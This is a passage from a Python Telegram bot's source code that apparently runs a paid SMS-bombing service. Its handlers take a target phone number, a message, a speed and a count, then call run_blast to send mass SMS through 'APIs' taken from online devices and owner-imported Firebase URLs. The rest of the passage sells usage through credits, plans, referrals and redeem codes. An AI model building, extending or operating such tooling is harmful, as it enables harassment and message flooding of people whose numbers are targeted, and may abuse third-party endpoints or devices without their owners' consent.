            await msg.answer(f"{em(EMOJI_LOCK, '🔒')} Protected!", parse_mode="HTML")
            return
    st = S.owner_send_message if role == "owner" else S.admin_send_message
    await state.update_data(number=n)
    await state.set_state(st)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <code>{mask_number(n)}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>",
        reply_markup=kb([(sc("cancel"), f"{role}:home")]),
        parse_mode="HTML",
    )

@R.message(S.owner_send_number)
async def owner_got_number(msg: Message, state: FSMContext):
    await _got_number(msg, state, "owner")

@R.message(S.admin_send_number)
async def admin_got_number(msg: Message, state: FSMContext):
    await _got_number(msg, state, "admin")

async def _got_msg(msg: Message, state: FSMContext, role: str):
    await state.update_data(message=msg.text.strip())
    st = S.owner_send_speed if role == "owner" else S.admin_send_speed
    await state.set_state(st)
    await msg.answer(
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>",
        reply_markup=speed_kb(role),
        parse_mode="HTML",
    )

@R.message(S.owner_send_message)
async def owner_got_msg(msg: Message, state: FSMContext):
    await _got_msg(msg, state, "owner")

@R.message(S.admin_send_message)
async def admin_got_msg(msg: Message, state: FSMContext):
    await _got_msg(msg, state, "admin")

async def _speed_sel(cq: CallbackQuery, state: FSMContext, role: str):
    sm = {
        f"{role}:speed:fast": SPEED_FAST,
        f"{role}:speed:medium": SPEED_MEDIUM,
        f"{role}:speed:slow": SPEED_SLOW,
    }
    sp = sm.get(cq.data, SPEED_MEDIUM)
    lbl = (
        "🚀 FAST" if sp == SPEED_FAST
        else "⚡ MEDIUM" if sp == SPEED_MEDIUM
        else "🐢 SLOW"
    )
    st = S.owner_send_count if role == "owner" else S.admin_send_count
    await state.update_data(send_speed=sp)
    await state.set_state(st)
    devs = get_cached_devices() or await get_all_online_devices(load())
    await cq.message.edit_text(
        f"{lbl} <b>selected!</b>\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} APIs: <b>{len(devs)}</b>\n\n"
        f"Kitne SMS?",
        reply_markup=kb([(sc("cancel"), f"{role}:home")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data.in_({"owner:speed:fast", "owner:speed:medium", "owner:speed:slow"}))
async def owner_speed_sel(cq: CallbackQuery, state: FSMContext):
    await _speed_sel(cq, state, "owner")

@R.callback_query(F.data.in_({"admin:speed:fast", "admin:speed:medium", "admin:speed:slow"}))
async def admin_speed_sel(cq: CallbackQuery, state: FSMContext):
    await _speed_sel(cq, state, "admin")

async def _got_count(msg: Message, state: FSMContext, role: str):
    fsmd = await state.get_data()
    try:
        cnt = int(msg.text.strip())
        assert cnt >= 1
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Number only!", parse_mode="HTML")
        return
    await state.clear()
    devs = get_cached_devices() or await get_all_online_devices(load())
    if not devs:
        await msg.answer(
            f"{em(EMOJI_WARNING, '😴')} No APIs!",
            reply_markup=kb([(sc("home"), f"{role}:home")]),
            parse_mode="HTML",
        )
        return
    await run_blast(
        msg.bot, msg, msg.from_user.id,
        fsmd.get("number", ""),
        fsmd.get("message", ""),
        cnt, devs,
        fsmd.get("send_speed", SPEED_DEFAULT),
    )

@R.message(S.owner_send_count)
async def owner_got_count(msg: Message, state: FSMContext):
    await _got_count(msg, state, "owner")

@R.message(S.admin_send_count)
async def admin_got_count(msg: Message, state: FSMContext):
    await _got_count(msg, state, "admin")

# ═══════════════════════════════════════════════════════════════
#                    USER PANEL HANDLERS
# ═══════════════════════════════════════════════════════════════

@R.callback_query(F.data == "user:home")
async def user_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    try:
        await cq.message.edit_text(
            user_home_text(cq.from_user.id, d),
            reply_markup=user_kb(),
            parse_mode="HTML",
        )
    except TelegramBadRequest:
        pass

@R.callback_query(F.data == "user:cancel")
async def user_cancel(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    try:
        await cq.message.edit_text(
            f"{em(EMOJI_CROSS, '❌')} Cancelled.",
            reply_markup=kb([(sc("home"), "user:home")]),
            parse_mode="HTML",
        )
    except:
        pass

@R.callback_query(F.data == "user:credits")
async def user_credits(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    ud = d["users"].get(str(uid), {})
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💰')} <b>Your Credits</b>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_MONEY, '💳')} Balance: <b>{ud.get('credits', 0)}</b>\n"
        f"{em(EMOJI_STAR, '🔢')} Uses: <b>{ud.get('uses', 0)}</b>\n"
        f"{em(EMOJI_CROWN, '👑')} Role: {role_tag(uid, d)}",
        reply_markup=kb([
            (sc("refer"), "user:refer"),
            (sc("redeem"), "user:redeem"),
            (sc("home"), "user:home"),
        ]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "user:refer")
async def user_refer(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    code = gen_refer_code(uid, d)
    save(d)
    try:
        me = await cq.bot.get_me()
        link = f"https://t.me/{me.username}?start={code}"
    except:
        link = f"https://t.me/bot?start={code}"
    await cq.message.edit_text(
        f"{em(EMOJI_GIFT, '🎁')} <b>Refer & Earn</b>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_STAR, '🔗')} Code: <code>{code}</code>\n"
        f"{em(EMOJI_BELL, '🔗')} Link:\n<code>{link}</code>\n\n"
        f"{em(EMOJI_MONEY, '💰')} Per refer: <b>{d.get('settings', {}).get('ref_credits', 3)}</b> credits (both)",
        reply_markup=kb([(sc("home"), "user:home")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "user:redeem")
async def user_redeem(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.redeem_code)
    await cq.message.edit_text(
        f"{em(EMOJI_GIFT, '🎁')} <b>Redeem Code</b>\n\nCode bhejo:",
        reply_markup=kb([(sc("cancel"), "user:home")]),
        parse_mode="HTML",
    )

@R.message(S.redeem_code)
async def user_redeem_code(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    code = msg.text.strip().upper()
    await state.clear()
    rcs = d.get("redeem_codes", {})
    if code not in rcs:
        await msg.answer(
            f"{em(EMOJI_CROSS, '❌')} Invalid code!",
            reply_markup=kb([(sc("home"), "user:home")]),
            parse_mode="HTML",
        )
        return
    rc = rcs[code]
    if rc.get("used_by") and uid in rc["used_by"]:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Already used!", parse_mode="HTML")
        return
    if rc.get("uses", 0) >= rc.get("max_uses", 1):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Expired!", parse_mode="HTML")
        return
    rc["uses"] = rc.get("uses", 0) + 1
    rc.setdefault("used_by", []).append(uid)
    add_credits(uid, rc.get("credits", 0), d)
    save(d)
    await msg.answer(
        f"{em(EMOJI_GIFT, '🎉')} <b>+{rc.get('credits', 0)} credits!</b>\n"
        f"{em(EMOJI_MONEY, '💳')} New: <b>{get_credits(uid, d)}</b>",
        reply_markup=kb([(sc("home"), "user:home")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "user:stats")
async def user_stats(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    ud = d["users"].get(str(uid), {})
    hist = d.get("sms_history", {}).get(str(uid), [])
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '📊')} <b>Your Stats</b>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_MONEY, '💰')} Credits: <b>{ud.get('credits', 0)}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} Uses: <b>{ud.get('uses', 0)}</b>\n"
        f"{em(EMOJI_STAR, '📜')} History: <b>{len(hist)}</b>",
        reply_markup=kb([(sc("home"), "user:home")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "user:sms_history")
async def user_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    hist = d.get("sms_history", {}).get(str(uid), [])[-15:]
    if not hist:
        await cq.message.edit_text(
            f"{em(EMOJI_CROSS, '❌')} No history!",
            reply_markup=kb([(sc("home"), "user:home")]),
            parse_mode="HTML",
        )
        return
    lines = [f"{em(EMOJI_STAR, '📜')} <b>Last {len(hist)} SMS</b>\n"]
    for h in reversed(hist):
        emoji = "✅" if h.get("status") in ("sent", "completed") else "🛑"
        lines.append(
            f"{emoji} <code>{mask_number(h.get('number', ''))}</code> — "
            f"{h.get('message', '')[:30]}"
        )
    await cq.message.edit_text(
        "\n".join(lines),
        reply_markup=kb([(sc("home"), "user:home")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "user:pricing")
async def user_pricing(cq: CallbackQuery, state: FSMContext):
    d = load()
    plans = d.get("pricing", {}).get("plans", [])
    if not plans:
        await cq.message.edit_text(
            f"{em(EMOJI_CROSS, '❌')} No plans!",
            reply_markup=kb([(sc("home"), "user:home")]),
            parse_mode="HTML",
        )
        return
    lines = [f"{em(EMOJI_MONEY, '💳')} <b>Available Plans</b>\n"]
    rows = []
    for p in plans:
        lines.append(
            f"\n{em(EMOJI_STAR, '⭐')} <b>{p['name']}</b>\n"
            f"💰 {p['price']} — 🎁 {p['credits']} credits"
        )
        if p.get("link"):
            rows.append([btn_url(f"ʙᴜʏ {p['name']}", p["link"], EMOJI_MONEY, "🛒")])
    rows.append([btn("ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙")])
    await cq.message.edit_text(
        "\n".join(lines),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "user:info")
async def user_info(cq: CallbackQuery, state: FSMContext):
    await cq.message.edit_text(
        f"{em(EMOJI_GEAR, 'ℹ️')} <b>Bot Info</b>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_STAR, '📌')} Version: <b>{_VERSION}</b>\n"
        f"{em(EMOJI_CROWN, '👑')} Owner: {SUPER_ADMIN_NAME}\n"
        f"{em(EMOJI_LOCK, '🔗')} Support: {SUPER_ADMIN_LINK}\n"
        f"{em(EMOJI_GEAR, '🔄')} Scanner: {get_scan_status()}",
        reply_markup=kb([(sc("home"), "user:home")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "user:random_video")
async def user_trigger_video(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not d.get("videos", []):
        await cq.answer("❌ No videos!", show_alert=True)
        return
    await cq.answer("📹 Sending...")
    await send_random_video(
        cq.bot, cq.message.chat.id,
        caption=f"{em(EMOJI_VIDEO, '📹')} Enjoy!"
    )

# ═══════════════════════════════════════════════════════════════
#                    TRANSFER CREDITS
# ═══════════════════════════════════════════════════════════════

@R.callback_query(F.data == "user:transfer")
async def user_transfer_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if is_banned(uid, d):
        await cq.answer("🚫 Banned!", show_alert=True)
        return
    cur = get_credits(uid, d)
    if cur < 2:
        await cq.answer("❌ Min 2 credits!", show_alert=True)
        return
    await state.set_state(S.transfer_credits_uid)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💸')} <b>Transfer</b>\n\n"
        f"💰 Your: <b>{cur}</b>\n"
        f"Max (half): <b>{cur // 2}</b>\n\n"
        f"Target User ID:",
        reply_markup=kb([(sc("cancel"), "user:home")]),
        parse_mode="HTML",
    )

@R.message(S.transfer_credits_uid)
async def user_transfer_uid(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    try:
        tgt = int(msg.text.strip())
    except:
        await msg.answer("❌ Valid ID!", parse_mode="HTML")
        return
    if tgt == uid:
        await msg.answer("❌ Self transfer nahi!", parse_mode="HTML")
        return
    if str(tgt) not in d.get("users", {}):
        await msg.answer("❌ User not exist!", parse_mode="HTML")
        return
    cur = get_credits(uid, d)
    if cur < 2:
        await msg.answer("❌ Min 2!", parse_mode="HTML")
        return
    await state.update_data(transfer_target=tgt)
    await state.set_state(S.transfer_credits_amount)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💸')} Max: <b>{cur // 2}</b>\nAmount bhejo:",
        parse_mode="HTML",
    )

@R.message(S.transfer_credits_amount)
async def user_transfer_amount(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    fsmd = await state.get_data()
    tgt = fsmd.get("transfer_target")
    try:
        amt = int(msg.text.strip())
        assert amt > 0
    except:
        await msg.answer("❌ Positive number!", parse_mode="HTML")
        return
    cur = get_credits(uid, d)
    if amt > cur // 2:
        await msg.answer(f"❌ Max {cur // 2}!", parse_mode="HTML")
        return
    if not deduct_credits(uid, amt, d):
        await msg.answer("❌ Insufficient!", parse_mode="HTML")
        return
    add_credits(tgt, amt, d)
    save(d)
    await state.clear()
    try:
        await msg.bot.send_message(
            tgt,
            f"{em(EMOJI_MONEY, '💸')} <b>Received {amt} credits</b>\n"
            f"From: <code>{uid}</code>\n"
            f"Balance: <b>{get_credits(tgt, d)}</b>",
            parse_mode="HTML",
        )
    except:
        pass
    await msg.answer(
        f"✅ Sent {amt} to <code>{tgt}</code>\n"
        f"💰 Your: <b>{get_credits(uid, d)}</b>",
        reply_markup=kb([(sc("home"), "user:home")]),
        parse_mode="HTML",
    )

# ═══════════════════════════════════════════════════════════════
#                    OWNER PANEL HANDLERS
# ═══════════════════════════════════════════════════════════════

@R.callback_query(F.data.in_({"owner:home", "owner:refresh"}))
async def owner_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫!", show_alert=True)
        return
    try:
        await cq.message.edit_text(
            owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

@R.callback_query(F.data.in_({"admin:home", "admin:refresh"}))
async def admin_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫!", show_alert=True)
        return
    try:
        await cq.message.edit_text(
            admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

@R.callback_query(F.data.in_({"owner:free:on", "owner:free:off"}))
async def owner_free_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫!", show_alert=True)
        return
    d["free_mode"] = cq.data.endswith(":on")
    save(d)
    await cq.answer(
        f"✅ Free mode {'ON' if d['free_mode'] else 'OFF'}",
        show_alert=True,
    )
    try:
        await cq.message.edit_text(
            owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML"
        )
    except:
        pass

# ═══════════════════════════════════════════════════════════════
#                    FIREBASE MANAGEMENT
# ═══════════════════════════════════════════════════════════════

@R.callback_query(F.data.startswith("owner:fb:menu"))
async def owner_fb_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫!", show_alert=True)
        return
    await state.clear()
    parts = cq.data.split(":")
    page = int(parts[3]) if len(parts) > 3 else 0
    try:
        await cq.message.edit_text(
            f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\n"
            f"Total: <b>{len(d.get('firebases', []))}</b>",
            reply_markup=fb_menu_kb(d, page),
            parse_mode="HTML",
        )
    except:
        pass

@R.callback_query(F.data == "owner:fb:add")
async def owner_fb_add_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫!", show_alert=True)
        return
    await state.set_state(S.add_firebase)
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Add Firebase</b>\n\n"
        f"Format: <code>Label | URL</code>",
        reply_markup=kb([(sc("cancel"), "owner:fb:menu:0")]),
        parse_mode="HTML",
    )

@R.message(S.add_firebase)
async def owner_fb_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    text = msg.text.strip()
    if "|" in text:
        lbl, url = [x.strip() for x in text.split("|", 1)]
    else:
        url = text
        lbl = url.replace("https://", "").split(".")[0][:20]
    if not url.startswith("http"):
        await msg.answer("❌ URL must start http!", parse_mode="HTML")
        return
    url = url.rstrip("/")
    fbs = d.get("firebases", [])
    if any(fb["url"] == url for fb in fbs):
        await state.clear()
        await msg.answer("⚠️ Already exists!", parse_mode="HTML")
        return
    fbs.append({
        "id": str(int(time.time())),
        "url": url,
        "label": lbl,
        "added_at": int(time.time()),
    })
    d["firebases"] = fbs
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Added: <b>{lbl}</b>",
        reply_markup=fb_menu_kb(load()),
        parse_mode="HTML",
    )

@R.callback_query(F.data.startswith("owner:fb:del:"))
async def owner_fb_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫!", show_alert=True)
        return
    parts = cq.data.split(":")
    fid = parts[3]
    d["firebases"] = [fb for fb in d.get("firebases", []) if fb["id"] != fid]
    save(d)
    await cq.answer("🗑 Removed!")
    await owner_fb_menu(cq, state)

@R.callback_query(F.data == "owner:fb:add_file")
async def owner_fb_add_file_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫!", show_alert=True)
        return
    await state.set_state(S.add_firebase_file)
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Add Firebase via TXT</b>\n\n"
        f".txt file bhejo (per line: URL or Label|URL)",
        reply_markup=kb([(sc("cancel"), "owner:fb:menu:0")]),
        parse_mode="HTML",
    )

@R.message(S.add_firebase_file, F.document)
async def owner_fb_file_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    doc = msg.document
    if not doc.file_name.endswith(".txt"):
        await msg.answer("❌ Only .txt!", parse_mode="HTML")
        return
    fi = await msg.bot.get_file(doc.file_id)
    f = await msg.bot.download_file(fi.file_path)
    content = f.read().decode("utf-8", errors="ignore")
    fbs = d.get("firebases", [])
    ex = {fb["url"].rstrip("/") for fb in fbs}
    added = 0
    skip = 0
    for line in content.splitlines():
        line = line.strip()
        if not line:
            continue
        if "|" in line:
            lbl, url = [x.strip() for x in line.split("|", 1)]
        else:
            url = line
            lbl = url.replace("https://", "").replace("http://", "").split(".")[0][:20]
        if not (url.startswith("http://") or url.startswith("https://")):
            continue
        url = url.rstrip("/")
        if url in ex:
            skip += 1
            continue
        ex.add(url)
        fbs.append({
            "id": str(int(time.time() * 1000) + random.randint(100, 999)),
            "url": url,
            "label": lbl,
            "added_at": int(time.time()),
        })
        added += 1
    d["firebases"] = fbs
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Done!</b>\n"
        f"➕ Added: <b>{added}</b>\n"
        f"⏭ Skipped: <b>{skip}</b>",
        reply_markup=fb_menu_kb(load()),
        parse_mode="HTML",
    )

# ═══════════════════════════════════════════════════════════════
#                    VIDEO MANAGEMENT
# ═══════════════════════════════════════════════════════════════

@R.callback_query(F.data == "owner:videos:menu")
async def owner_videos_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫!", show_alert=True)
        return
    try:
        await cq.message.edit_text(
            f"{em(EMOJI_VIDEO, '📹')} <b>Video Manager</b>\n\n"
            f"Total: <b>{len(d.get('videos', []))}</b>",
            reply_markup=videos_menu_kb(d),
            parse_mode="HTML",
        )
    except:
        pass

@R.callback_query(F.data == "owner:videos:add")
async def owner_videos_add_start(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()):
        await cq.answer("🚫!", show_alert=True)
        return
    await state.set_state(S.add_video)
    await cq.message.edit_text(
        f"{em(EMOJI_VIDEO, '📹')} <b>Add Video</b>\n\nVideo ya URL/File ID bhejo:",
        reply_markup=kb([(sc("cancel"), "owner:videos:menu")]),
        parse_mode="HTML",
    )

@R.message(S.add_video)
async def owner_videos_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear()
        return
    fid = None
    if msg.video:
        fid = msg.video.file_id
    elif msg.document and (msg.document.mime_type or "").startswith("video"):
        fid = msg.document.file_id
    elif msg.text:
        fid = msg.text.strip()
    if not fid:
        await msg.answer("❌ Valid video bhejo!", parse_mode="HTML")
        return
    d.setdefault("videos", []).append(fid)
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Video saved!",
        reply_markup=videos_menu_kb(load()),
        parse_mode="HTML",
    )

@R.callback_query(F.data.startswith("owner:videos:del:"))
async def owner_videos_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫!", show_alert=True)
        return
    idx = int(cq.data.split("owner:videos:del:")[1])
    vids = d.get("videos", [])
    if 0 <= idx < len(vids):
        vids.pop(idx)
        d["videos"] = vids
        save(d)
        await cq.answer("🗑 Removed!")
    await owner_videos_menu(cq, state)

@R.callback_query(F.data == "owner:videos:bulk_del")
async def owner_videos_bulk_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫!", show_alert=True)
        return
    d["videos"] = []
    save(d)
    await cq.answer("🗑 All deleted!", show_alert=True)
    await owner_videos_menu(cq, state)

# ═══════════════════════════════════════════════════════════════
#                    OWNERS / ADMINS MANAGEMENT
# ═══════════════════════════════════════════════════════════════

@R.callback_query(F.data == "owner:owners:menu")
async def owner_owners_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫!", show_alert=True)
        return
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '👑')} <b>Super Admins</b>",
        reply_markup=owners_menu_kb(d),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:owners:add")
async def owner_owners_add(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫!", show_alert=True)
        return
    await state.set_state(S.add_owner)
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '👑')} <b>Add Super Admin</b>\n\nUser ID bhejo:",
        reply_markup=kb([(sc("cancel"), "owner:owners:menu")]),
        parse_mode="HTML",
    )

@R.message(S.add_owner)
async def owner_owners_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        uid = int(msg.text.strip())
    except:
        await msg.answer("❌ Valid ID!", parse_mode="HTML")
        return
    if uid in d["owners"]:
        await msg.answer("⚠️ Already!", parse_mode="HTML")
        return
    if len(d["owners"]) >= 6:
        await msg.answer("❌ Max 6 owners!", parse_mode="HTML")
        return
    d["owners"].append(uid)
    save(d)
    await state.clear()
    await msg.answer(
        f"✅ Added {uid} as Super Admin",
        reply_markup=owners_menu_kb(load()),
        parse_mode="HTML",
    )

@R.callback_query(F.data.startswith("owner:owners:del:"))
async def owner_owners_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫!", show_alert=True)
        return
    oid = int(cq.data.split("owner:owners:del:")[1])
    if oid == MAIN_OWNER:
        await cq.answer("❌ Cannot remove main owner!", show_alert=True)
        return
    if oid in d["owners"]:
        d["owners"].remove(oid)
        save(d)
        await cq.answer("🗑 Removed!")
    await owner_owners_menu(cq, state)

@R.callback_query(F.data == "owner:admins:menu")
async def owner_admins_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫!", show_alert=True)
        return
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admins</b>",
        reply_markup=admins_menu_kb(d),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:admins:add")
async def owner_admins_add(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫!", show_alert=True)
        return
    await state.set_state(S.add_admin)
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>Add Admin</b>\n\nUser ID bhejo:",
        reply_markup=kb([(sc("cancel"), "owner:admins:menu")]),
        parse_mode="HTML",
    )

@R.message(S.add_admin)
async def owner_admins_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        uid = int(msg.text.strip())
    except:
        await msg.answer("❌ Valid ID!", parse_mode="HTML")
        return
    if uid in d["admins"]:
        await msg.answer("⚠️ Already!", parse_mode="HTML")
        return
    d["admins"].append(uid)
    save(d)
    await state.clear()
    await msg.answer(
        f"✅ Admin added: {uid}",
        reply_markup=admins_menu_kb(load()),
        parse_mode="HTML",
    )

@R.callback_query(F.data.startswith("owner:admins:del:"))
async def owner_admins_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫!", show_alert=True)
        return
    aid = int(cq.data.split("owner:admins:del:")[1])
    if aid in d["admins"]:
        d["admins"].remove(aid)
        save(d)
        await cq.answer("🗑!")
    await owner_admins_menu(cq, state)

# ═══════════════════════════════════════════════════════════════
#                    USERS / BAN
# ═══════════════════════════════════════════════════════════════

@R.callback_query(F.data == "owner:users:list")
async def owner_users_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫!", show_alert=True)
        return
    txt, kbd = users_list_kb(d, "owner", 0)
    await cq.message.edit_text(txt, reply_markup=kbd, parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:users:pg:"))
async def owner_users_pg(cq: CallbackQuery, state: FSMContext):
    d = load()
    pg = int(cq.data.split(":")[-1])
    txt, kbd = users_list_kb(d, "owner", pg)
    try:
        await cq.message.edit_text(txt, reply_markup=kbd, parse_mode="HTML")
    except:
        pass

@R.callback_query(F.data == "admin:users:list")
async def admin_users_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫!", show_alert=True)
        return
    txt, kbd = users_list_kb(d, "admin", 0)
    await cq.message.edit_text(txt, reply_markup=kbd, parse_mode="HTML")

@R.callback_query(F.data.startswith("admin:users:pg:"))
async def admin_users_pg(cq: CallbackQuery, state: FSMContext):
    d = load()
    pg = int(cq.data.split(":")[-1])
    txt, kbd = users_list_kb(d, "admin", pg)
    try:
        await cq.message.edit_text(txt, reply_markup=kbd, parse_mode="HTML")
    except:
        pass

@R.callback_query(F.data.in_({"owner:ban", "admin:ban"}))
async def owner_ban_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫!", show_alert=True)
        return
    await state.set_state(S.ban_user)
    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '🚫')} <b>Ban User</b>\n\nUser ID bhejo:",
        reply_markup=kb([(sc("cancel"), "owner:home" if is_owner(uid, d) else "admin:home")]),
        parse_mode="HTML",
    )

@R.message(S.ban_user)
async def owner_ban_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    try:
        tid = int(msg.text.strip())
    except:
        await msg.answer("❌ Valid ID!", parse_mode="HTML")
        return
    if tid == MAIN_OWNER:
        await msg.answer("❌ Cannot ban owner!", parse_mode="HTML")
        return
    if tid in d["banned"]:
        await msg.answer("⚠️ Already banned!", parse_mode="HTML")
        return
    d["banned"].append(tid)
    save(d)
    await state.clear()
    await msg.answer(
        f"✅ Banned: {tid}",
        reply_markup=kb([(sc("home"), "owner:home" if is_owner(uid, d) else "admin:home")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data.in_({"owner:unban:menu", "admin:unban:menu"}))
async def owner_unban_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫!", show_alert=True)
        return
    prefix = "owner" if cq.data.startswith("owner") else "admin"
    banned = d.get("banned", [])
    if not banned:
        await cq.message.edit_text(
            f"{em(EMOJI_CHECK, '✅')} No banned users.",
            reply_markup=kb([(sc("back"), f"{prefix}:home")]),
            parse_mode="HTML",
        )
        return
    await cq.message.edit_text(
        f"{em(EMOJI_CHECK, '✅')} <b>Unban User</b>\n\nSelect:",
        reply_markup=unban_menu_kb(d, prefix),
        parse_mode="HTML",
    )

@R.callback_query(F.data.startswith("owner:unban:do:") | F.data.startswith("admin:unban:do:"))
async def owner_unban_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫!", show_alert=True)
        return
    parts = cq.data.split(":")
    bid = int(parts[-1])
    if bid in d["banned"]:
        d["banned"].remove(bid)
        save(d)
        await cq.answer(f"✅ Unbanned {bid}!")
    await owner_unban_menu(cq, state)

# ═══════════════════════════════════════════════════════════════
#                    BROADCAST
# ═══════════════════════════════════════════════════════════════

@R.callback_query(F.data.in_({"owner:broadcast", "admin:broadcast"}))
async def owner_broadcast_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫!", show_alert=True)
        return
    prefix = "owner" if cq.data.startswith("owner") else "admin"
    await state.set_state(S.broadcast)
    await state.update_data(bc_prefix=prefix)
    await cq.message.edit_text(
        f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\nMessage bhejo (sab users ko jayega):",
